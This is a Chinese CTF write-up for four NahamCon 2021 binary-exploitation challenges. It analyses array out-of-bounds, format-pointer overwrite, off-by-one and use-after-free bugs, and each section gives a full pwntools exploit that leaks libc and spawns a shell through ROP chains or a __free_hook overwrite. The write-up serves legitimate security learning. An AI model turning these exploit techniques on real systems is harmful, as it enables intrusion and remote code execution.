> 原文链接: https://www.anquanke.com//post/id/234647 


# NahamConCTF2021 PWN WP


                                阅读量   
                                **174030**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01c0fffa4c72aeb5fd.jpg)](https://p2.ssl.qhimg.com/t01c0fffa4c72aeb5fd.jpg)



## Sort it

首先看一下程序的整体逻辑

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  char v4; // [rsp+Fh] [rbp-71h]
  __int64 v5; // [rsp+10h] [rbp-70h] BYREF
  __int64 v6; // [rsp+18h] [rbp-68h] BYREF
  __int64 v7[12]; // [rsp+20h] [rbp-60h] BYREF

  v7[11] = __readfsqword(0x28u);
  v4 = 0;
  v7[0] = 'egnaro';
  v7[1] = 'eton';
  v7[2] = 'elppa';
  v7[3] = 'puc';
  v7[4] = 'daerb';
  v7[5] = 'arbez';
  v7[6] = 'dnah';
  v7[7] = 'naf';
  v7[8] = 'noil';
  v7[9] = 'licnep';
  clear();
  puts("Sort the following words in alphabetical order.\n");
  print_words((__int64)v7);
  printf("Press any key to continue...");
  getchar();
  while ( v4 != 1 )
  `{`
    clear();
    print_words((__int64)v7);
    printf("Enter the number for the word you want to select: ");
    __isoc99_scanf("%llu", &amp;v5);
    getchar();
    --v5;
    printf("Enter the number for the word you want to replace it with: ");
    __isoc99_scanf("%llu", &amp;v6);
    getchar();
    swap((__int64)v7, v5, --v6);
    clear();
    print_words((__int64)v7);
    printf("Are the words sorted? [y/n]: ");
    fgets(&amp;yn, 17, stdin);
    if ( yn != 'n' )
    `{`
      if ( yn != 'y' )
      `{`
        puts("Invalid choice");
        getchar();
        exit(0);
      `}`
      v4 = 1;
    `}`
  `}`
  if ( (unsigned int)check((__int64)v7) )
  `{`
    puts("You lose!");
    exit(0);
  `}`
  puts("You win!!!!!");
  return 0;
`}`
```

程序循环对给定的字符串数组进行排序，但是程序没有限制输入的`index`的范围，也就是存在数组越界漏洞。

根据数组越界漏洞结合`print_words`函数即可泄漏出栈中的一些内容，得到`libc,elf`基地址和栈地址。泄漏得到地址之后还存在一个问题就是如何将数据写入到栈中。

这里注意到`fgets`函数可以读取`0x11`字节的内容，那么我们就可以先将内容写入到`bss`中，再根据数组越界和`swap`函数将内容写入到栈中，这就构成了一个栈溢出，依次写入`rop`内容即可。

至于`rop`的触发需要等到`main`函数返回时才能执行，因此这里需要满足`check`的检查，即对字符串数组中的单词依照首字母从小到大进行排序。

```
# encoding=utf-8
from pwn import *

file_path = "./sort_it"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe6e73, 0xe6e76, 0xe6e79]

else:
    p = remote('challenge.nahamcon.com', 32633)
    libc = ELF('./libc-2.31.so')
    one_gadget = [0xe6e73, 0xe6e76, 0xe6e79]


def sort(index1, index2, end=False):
    p.sendlineafter("want to select: ", str(index1))
    p.sendlineafter(" replace it with: ", str(index2))
    if end:
        p.sendlineafter("sorted? [y/n]: ", "y")
    else:
        p.sendlineafter("sorted? [y/n]: ", "n")


def overflow(index, value):
    p.sendlineafter("want to select: ", str(1))
    p.sendlineafter(" replace it with: ", str(1))
    p.sendlineafter("sorted? [y/n]: ", b"n".ljust(8, b"\x00") + p64(value))
    sort(index, yn_offset)


p.sendlineafter("continue...", "\n")

sort(3, 1)
sort(3, 8)
sort(3, 4)
sort(5, 2)
sort(5, 7)
sort(6, 10)
sort(6, 9)

sort(1, 11)
p.recvuntil("1. ")
list_address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x150
log.success("list address is `{``}`".format(hex(list_address)))
sort(11, 1)
sort(1, 14)
p.recvuntil("1. ")
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 243 - libc.sym['__libc_start_main']
log.success("libc address is `{``}`".format(hex(libc.address)))
sort(14, 1)
sort(1, 18)
p.recvuntil("1. ")
elf.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x139f
log.success("elf address is `{``}`".format(hex(elf.address)))
sort(18, 1)

p_rdi_r = 0x0000000000026b72 + libc.address
p_rsi_r = 0x0000000000027529 + libc.address
p_rdx_r12_r = 0x000000000011c371 + libc.address
yn_offset = int(((elf.address + 0x4030 - list_address) &amp; 0xffffffffffffffff) // 8) + 2
overflow(14, p_rdi_r)
overflow(15, libc.search(b"/bin/sh").__next__())
overflow(16, p_rsi_r)
overflow(17, 0)
overflow(18, p_rdx_r12_r)
overflow(19, 0)
overflow(20, 0)
overflow(21, libc.sym['execve'])
sort(1, 1, True)
p.interactive()
```



## Rock Paper Scissors

首先来看一下程序的整体逻辑

```
void real_main()
`{`
  unsigned int v0; // eax
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  int v2; // [rsp+8h] [rbp-8h]
  char v3; // [rsp+Fh] [rbp-1h]

  v3 = 1;
  v0 = time(0LL);
  srand(v0);
  while ( v3 )
  `{`
    v2 = rand() % 3 + 1;
    menu();
    __isoc99_scanf(off_404028, &amp;v1);
    getchar();
    if ( v2 == v1 )
      puts("Congrats you win!!!!!");
    else
      puts("You lose!");
    putchar(10);
    printf("Would you like to play again? [yes/no]: ");
    read(0, &amp;s2, 0x19uLL);
    if ( !strcmp("no\n", &amp;s2) )
    `{`
      v3 = 0;
    `}`
    else if ( !strcmp("yes\n", &amp;s2) )
    `{`
      v3 = 1;
    `}`
    else
    `{`
      puts("Well you didn't say yes or no..... So I'm assuming no.");
      v3 = 0;
    `}`
    memset(&amp;s2, 0, 4uLL);
  `}`
`}`
```

目测起来没有什么不对的地方，但是我们看一下`scanf`的格式化字符串

```
.data:0000000000404010 ; char s2
.data:0000000000404010 s2              db 1                    ; DATA XREF: real_main+C1↑o
.data:0000000000404010                                         ; real_main+D2↑o ...
.data:0000000000404011                 align 20h
.data:0000000000404020                 dq offset unk_402008
.data:0000000000404028 off_404028      dq offset unk_40200B    ; DATA XREF: real_main+5F↑r
.data:0000000000404028 _data           ends
```

发现存储格式化字符串地址的位置和`s2`紧邻，而`s2`可以读取`0x19`字节长度的字符串，也就是说我们可以覆写`off_404028`的低一字节。

看一下格式化字符串附近的东西

```
.rodata:0000000000402007                 db    0
.rodata:0000000000402008 unk_402008      db  25h ; %             ; DATA XREF: .data:0000000000404020↓o
.rodata:0000000000402009                 db  73h ; s
.rodata:000000000040200A                 db    0
.rodata:000000000040200B unk_40200B      db  25h ; %             ; DATA XREF: .data:off_404028↓o
.rodata:000000000040200C                 db  64h ; d
```

看到其低地址出存在一个`%s`，也就是我们可以将`%d`更换为`%s`。也就是将程序中的

```
__isoc99_scanf("%d", &amp;v1);
```

更改为

```
__isoc99_scanf("%s", &amp;v1);
```

也就是构造出了一个栈溢出的漏洞。那么接下来就是`rop`链的构造。

这里我是先利用`puts`函数泄漏出`libc`的基地址，接着利用`csu`调用`read`函数向`bss`段中写入新的`rop`链，接着进行栈迁移，将栈地址迁移到`bss`段中，执行新的`rop`进而`getshell`。

```
# encoding=utf-8
from pwn import *

file_path = "./rps"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    gdb.attach(p, "b *0x401451")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else:
    p = remote('challenge.nahamcon.com', 30002)
    libc = ELF('./libc-2.31.so')


csu_start = 0x401506
csu_end = 0x4014F0
bss_address = 0x404050
leave_r = 0x0000000000401451
p_rbp_r = 0x000000000040127d


def csu_call(address, arg0, arg1, arg2):
    ret = p64(csu_start) + p64(0)*2 + p64(1) + p64(arg0) + p64(arg1) + p64(arg2)
    ret += p64(address) + p64(csu_end)
    return ret


p.sendlineafter("Rock-Paper-Scissors? [y/n]: ", "y")
p.sendlineafter("&gt; ", "1")
p.sendafter("again? [yes/no]: ", b"yes\n".ljust(0x18, b"\x00") + b"\x08")

p_rdi_r = 0x0000000000401513
payload = b"a" * 0xc + p64(bss_address)
payload += p64(p_rdi_r) + p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += csu_call(elf.got['read'], 0, bss_address, 0x100)
payload += p64(0)*7
payload += p64(p_rbp_r) + p64(bss_address) + p64(leave_r)

p.sendlineafter("&gt; ", payload)
p.sendafter("again? [yes/no]: ", b"no\n")

libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - libc.sym['read']
log.success("libc address is `{``}`".format(hex(libc.address)))

p_rsi_r = 0x0000000000027529 + libc.address
p_rdx_r12_r = 0x000000000011c371 + libc.address

exp = p64(0) + p64(p_rdi_r) + p64(libc.search(b"/bin/sh\x00").__next__())
exp += p64(p_rsi_r) + p64(0) + p64(p_rdx_r12_r) + p64(0)*2
exp += p64(libc.sym['execve'])

p.sendline(exp)

p.interactive()
```



## Empty Read

这是一个`32`位的程序。

首先我们看一下程序的整体逻辑。程序一共提供了`4`种功能和一个用来查看远程`libc`版本的`debug`选项。这四个功能分别是`add,edit,show,delete`。依次来看一下，首先是`add`函数。

```
puts("\tUser index to add:");
  read(0, buf, 4u);
  index = atoi(buf);
  if ( index &lt; 0 || index &gt; 9 || user_list[index] )
  `{`
    puts("\tInvalid user index!");
  `}`
  else
  `{`
    user_list[index] = (struct my_user *)malloc(8u);
    if ( !user_list[index] )
      goto LABEL_6;
    memset(buf, 0, sizeof(buf));
    puts("\tUser email length:");
    read(0, buf, 4u);
    email_length = atoi(buf);
    if ( email_length &lt;= 0 || email_length &gt; 512 )
      email_length = 512;
    user_list[index]-&gt;email_length = email_length;
    v0 = user_list[index];
    v0-&gt;email = (int)malloc(v0-&gt;email_length);
    if ( user_list[index]-&gt;email )
    `{`
      puts("\tUser email:");
      length = read(0, (void *)user_list[index]-&gt;email, user_list[index]-&gt;email_length);
      if ( length &lt;= 0 )
        *(_BYTE *)user_list[index]-&gt;email = 0;
      else
        *(_BYTE *)(user_list[index]-&gt;email + length) = 0;
    `}`
    else
    `{`
LABEL_6:
      puts("\tSomething went wrong, try again!");
    `}`
  `}`
```

首先是申请了一个`0x10`大小的`user`结构体用来存放堆块指针。然后根据用户指定的大小，申请了相应大小的堆块。将`size`和堆块指针写入到了结构体中。这里很明显的存在一个`off-by-one`漏洞。

`show`函数则是根据用户给定的`index`输出了堆块的内容，`delete`删除了堆块，并将`user_list`相应位置清空。接下来看一下`edit`函数。

```
unsigned int edit()
`{`
  unsigned int result; // eax
  int index; // [esp+0h] [ebp-18h]
  ssize_t length; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v4; // [esp+Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  puts("\tUser index to edit:");
  read(0, buf, 4u);
  index = atoi(buf);
  if ( index &gt;= 0 &amp;&amp; index &lt;= 9 &amp;&amp; user_list[index] )
  `{`
    puts("\tUser email:");
    length = read(0, *(void **)(user_list[index] + 4), *(_DWORD *)user_list[index]);
    if ( length &lt;= 0 )
      **(_BYTE **)(user_list[index] + 4) = 0;
    else
      *(_BYTE *)(*(_DWORD *)(user_list[index] + 4) + length) = 0;
    printf("\tUser %d updated\n", index);
  `}`
  else
  `{`
    puts("\tInvalid user index!");
  `}`
  result = __readgsdword(0x14u) ^ v4;
  if ( result )
    sub_FF0();
  return result;
`}`
```

这里就是根据用户在`add`中设置的堆块大小对堆块的内容进行重新编辑。这里也存在一个`off-by-one`的漏洞。

那么接下来整体的思路就是利用`off-by-one`构造堆重叠。进而泄漏出`libc`地址。再次利用堆重叠（这里主要是防止高版本的`libc2.27`的影响）构造出堆溢出，覆写`tcache-&gt;fd`指针指向`free_hook`，进而覆写`free_hook`为`system`，`getshell`。

```
# encoding=utf-8
from pwn import *

file_path = "./chall"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')

else:
    p = remote('challenge.nahamcon.com', 30770)
    libc = ELF('./libc-2.27.so')


def add(index, size, content=b"1"):
    p.sendlineafter("---------\n", "add")
    p.sendlineafter("index to add:\n", str(index))
    p.sendlineafter("email length:\n", str(size))
    p.sendafter("User email:\n", content)


def show():
    p.sendlineafter("---------\n", "print")


def edit(index, content):
    p.sendlineafter("---------\n", "edit")
    p.sendlineafter("index to edit:\n", str(index))
    p.sendafter("User email:\n", content)


def delete(index):
    p.sendlineafter("---------\n", "delete")
    p.sendlineafter("index to delete:\n", str(index))


for i in range(10):
    add(i, 0x8)
for i in range(10):
    delete(i)

for i in range(10):
    add(i, 0xfc)

for i in range(7):
    delete(3 + i)


delete(0)
edit(1, b"a" * 0xf8 + p32(0x200))
delete(2)

for i in range(7):
    add(3+i, 0xfc)


add(0, 0xfc)
show()

p.recvuntil("User 1 email: ")
libc.address = u32(p.recv(4)) - 0x38 - 0x18 - libc.sym['__malloc_hook']

for i in range(7):
    delete(3 + i)

delete(0)
for i in range(7):
    add(3+i, 0xfc, b"/bin/sh")

log.success("libc address is `{``}`".format(hex(libc.address)))
# gdb.attach(p, "b *$rebase(0xE23)")

add(0, 0x130)
edit(0, b"a"*0xfc + p32(0x101) + p32(libc.sym['__free_hook']))

delete(3)
delete(1)
edit(0, b"a"*0xfc + p32(0x101) + p32(libc.sym['__free_hook']))

add(1, 0xfc)
add(2, 0xfc, p32(libc.sym['system']))

delete(4)

p.interactive()
```



## Meddle

首先来看一下程序的整体逻辑。程序一共提供了四种功能`add,show,rate,delete`。分别来看一下，首先是`add`函数。

```
int add_album()
`{`
  int v0; // eax
  __int64 v1; // rcx
  struct album **v2; // rax
  struct album *v4; // [rsp+8h] [rbp-8h]

  if ( count &gt; 17 )
  `{`
    LODWORD(v2) = puts("no more albums :(");
  `}`
  else
  `{`
    v4 = (struct album *)malloc(0x84uLL);
    printf("enter album name: ");
    fgets(v4-&gt;name, 0x50, stdin);
    printf("enter artist name: ");
    fgets(v4-&gt;artlist, 0x30, stdin);
    v0 = count++;
    v1 = v0;
    v2 = albums_list;
    albums_list[v1] = v4;
  `}`
  return (int)v2;
`}`
```

申请了一个固定大小的堆块`0x90`，其结构体如下

```
00000000 album           struc ; (sizeof=0x84, mappedto_8)
00000000 rate            dd ?
00000004 name            db 80 dup(?)
00000054 artlist         db 48 dup(?)
00000084 album           ends
```

接着根据用户的输入设置了`name,artlist`字符数组的内容。`show`函数则是直接输出了结构体中的内容。`rate`函数则是设置了`rate`成员变量的值。接着看一下`delete`函数。

```
void delete_album()
`{`
  int v0; // [rsp+Ch] [rbp-4h]

  printf("what album would you like to delete? ");
  v0 = getnum();
  if ( v0 &lt; 0 || v0 &gt;= count )
    puts("invalid index :(");
  else
    free(albums_list[v0]);
`}`
```

很明显的存在`UAF`漏洞。

这里的漏洞利用就很简单了，首先是利用`UAF`泄漏出`libc`基地址，然后再次利用`UAF`覆写`tcache-&gt;fd`指针为`free_hook`，接着覆写`free_hook`为`system`。

有点麻烦的就是写入`fd`和值的时候需要分为两个四字节来写。

```
# encoding=utf-8
from pwn import *

file_path = "./meddle"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else:
    p = remote('challenge.nahamcon.com', 31490)
    libc = ELF('./libc-2.27.so')


def add(name=b"11111111\n", artlist=b"222222222\n"):
    p.sendlineafter("&gt; ", "1")
    p.sendafter("album name: ", name)
    p.sendafter("artist name: ", artlist)


def show(index):
    p.sendlineafter("&gt; ", "2")
    p.sendlineafter("like to view? ", str(index))


def rate(index, value):
    p.sendlineafter("&gt; ", "3")
    p.sendlineafter("you like to rate? ", str(index))
    p.sendlineafter("to rate this album? ", str(value))


def delete(index):
    p.sendlineafter("&gt; ", "4")
    p.sendlineafter("you like to delete? ", str(index))


def get_address():
    p.recvuntil("album name: ")
    hig = u16(p.recvline().strip())
    p.recvuntil("ratings: ")
    address = (int(p.recvline().strip()) &amp; 0xffffffff) + (hig &lt;&lt; 32)
    return address


def set_value(index, value):
    add(name=p32(value &gt;&gt; 32) + b"\n")  # 11
    rate(index, value &amp; 0xffffffff)


for i in range(8):
    add()

for i in range(7):
    delete(1 + i)
# gdb.attach(p, "b *$rebase(0xD14)")

delete(0)
show(0)

libc.address = get_address() - 96 - 0x10 - libc.sym['__malloc_hook']
log.success("libc address is `{``}`".format(hex(libc.address)))

show(7)
heap_address = get_address()
log.success("heap address is `{``}`".format(hex(heap_address)))

add()  # 8
set_value(9, 0x68732f6e69622f)
add()  # 10

delete(8)
delete(7)

set_value(11, libc.sym['__free_hook'])

add()
set_value(13, libc.sym['system'])

delete(9)

p.interactive()
```
